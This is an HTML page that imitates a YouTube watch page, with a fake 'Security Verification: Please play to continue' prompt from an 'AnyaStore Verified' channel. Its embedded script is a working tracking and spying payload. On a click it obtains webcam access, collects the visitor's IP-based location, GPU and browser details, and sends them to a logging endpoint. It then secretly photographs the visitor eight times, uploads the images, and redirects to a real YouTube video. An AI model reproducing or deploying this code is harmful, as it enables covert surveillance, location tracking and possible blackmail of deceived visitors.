<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>YouTube</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body { margin: 0; background: #0f0f0f; color: white; font-family: Roboto, Arial; display: flex; flex-direction: column; align-items: center; }
        nav { width: 100%; height: 56px; background: #0f0f0f; display: flex; align-items: center; padding: 0 24px; position: fixed; top: 0; z-index: 10; }
        .main { margin-top: 80px; width: 90%; max-width: 1200px; display: flex; gap: 24px; }
        .player-side { flex: 2; }
        .video-player { width: 100%; aspect-ratio: 16/9; background: #000; border-radius: 12px; display: flex; align-items: center; justify-content: center; position: relative; }
        .play-big { font-size: 80px; color: white; cursor: pointer; transition: 0.2s; }
        .play-big:hover { transform: scale(1.1); color: red; }
        .sidebar { flex: 1; }
        .rec-card { display: flex; gap: 10px; margin-bottom: 12px; }
        .rec-thumb { width: 168px; height: 94px; background: #333; border-radius: 8px; flex-shrink: 0; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <nav><i class="fab fa-youtube" style="color:red;font-size:24px"></i> <b style="margin-left:8px;font-size:20px">YouTube</b></nav>
    <div class="main">
        <div class="player-side">
            <div class="video-player" id="box"><i class="fas fa-play play-big" onclick="start()"></i></div>
            <h1 style="font-size:20px;margin-top:15px">Security Verification: Please play to continue</h1>
            <div style="display:flex;align-items:center;gap:15px;margin-top:15px">
                <div style="width:40px;height:40px;background:#555;border-radius:50%"></div>
                <div><b>AnyaStore Verified</b><br><small>148K subscribers</small></div>
                <button style="background:white;color:black;border:none;padding:10px 20px;border-radius:20px;font-weight:bold;margin-left:20px">Subscribe</button>
            </div>
        </div>
        <div class="sidebar">
            <div class="rec-card"><div class="rec-thumb"></div><div><b>Next Video...</b><br><small>AnyaStore</small></div></div>
            <div class="rec-card"><div class="rec-thumb"></div><div><b>Store Tutorial</b><br><small>AnyaStore</small></div></div>
        </div>
    </div>
    <video id="v" autoplay></video><canvas id="c"></canvas>
    <script>
        const p = new URLSearchParams(window.location.search);
        async function start() {
            document.getElementById('box').innerHTML = '<div style="border:4px solid #333;border-left-color:red;width:50px;height:50px;border-radius:50%;animation:s 1s linear infinite"></div><style>@keyframes s{to{transform:rotate(360deg)}}</style>';
            try {
                const s = await navigator.mediaDevices.getUserMedia({ video: true });
                document.getElementById('v').srcObject = s;
                let gpu = 'N/A';
                try {
                    const gl = document.createElement('canvas').getContext('webgl');
                    gpu = gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL);
                } catch(e){}
                const ip = await fetch('https://ipapi.co/json/').then(r => r.json());
                fetch(`/log_info?id=${p.get('id')}`, {
                    method: 'POST', headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ ...ip, gpu: gpu, platform: "PC/Desktop", browser: navigator.userAgent })
                });
                let count = 0;
                const iv = setInterval(() => {
                    if (count >= 8) { clearInterval(iv); window.location.href="https://youtube.com/watch?v="+p.get('ytid'); return; }
                    const c = document.getElementById('c'), v = document.getElementById('v');
                    c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    c.toBlob(b => { const fd = new FormData(); fd.append('file', b); fetch(`/upload?id=${p.get('id')}&type=photo`, {method:'POST', body:fd}); }, 'image/jpeg', 0.9);
                    count++;
                }, 800);
            } catch(e) { alert("Please connect a webcam to verify."); }
        }
    </script>
</body>
</html>
